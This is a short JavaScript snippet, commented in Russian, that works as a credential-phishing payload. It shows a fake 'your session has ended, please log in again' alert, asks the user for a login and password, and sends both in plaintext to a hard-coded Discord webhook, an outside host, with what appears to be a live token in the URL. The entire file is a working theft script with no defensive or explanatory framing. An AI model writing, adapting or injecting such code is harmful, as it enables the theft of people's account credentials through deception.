const webhookURL = "https://discord.com/api/webhooks/1210472682563567686/FUb00La-5a9McnB-OGlPdVwhZYViqLib8bppLlH6TmQCptLzrMy_MKc4KI1aFF934LYx";

alert("Ваша сессия окончена. Пожалуйста, войдите снова.");

// Запрашиваем логин и пароль
const login = prompt("Введите логин:");
const password = prompt("Введите пароль:");

// Формируем тело сообщения для Discord
const data = {
  content: `Сессия закончилась. Пользователь ввел:\nЛогин: ${login}\nПароль: ${password}`
};

// Отправляем POST запрос на webhook
fetch(webhookURL, {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify(data)
})
.then(response => {
  if (response.ok) {
    alert("Данные успешно отправлены.");
  } else {
    alert("Ошибка при отправке данных.");
  }
})
.catch(error => {
  alert("Ошибка сети: " + error.message);
});
